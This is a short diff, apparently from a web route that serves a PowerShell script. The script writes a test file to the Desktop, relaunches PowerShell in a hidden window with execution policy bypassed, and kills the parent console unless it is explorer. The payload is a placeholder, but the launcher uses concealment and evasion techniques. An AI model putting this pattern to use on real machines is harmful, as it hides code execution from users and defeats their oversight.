@@ -12,8 +12,7 @@ $script = {
     Add-Content -Path ([Environment]::GetFolderPath('Desktop')+'/a.txt') -Value test
     Read-Host
     }
-Start-Process powershell -WindowStyle Hidden -ArgumentList @("-WindowStyle", "Hidden", "-noexit", "-ExecutionPolicy", "Bypass", $script.ToString());
-
+Start-Process powershell -WindowStyle Hidden -ArgumentList @("-WindowStyle", "Hidden", "-noexit", "-ExecutionPolicy", "Bypass", $script.ToString())
 if($parent.ProcessName -ne "explorer"){Stop-Process -InputObject $parent -Force};
 Exit`
   return new NextResponse(script, {
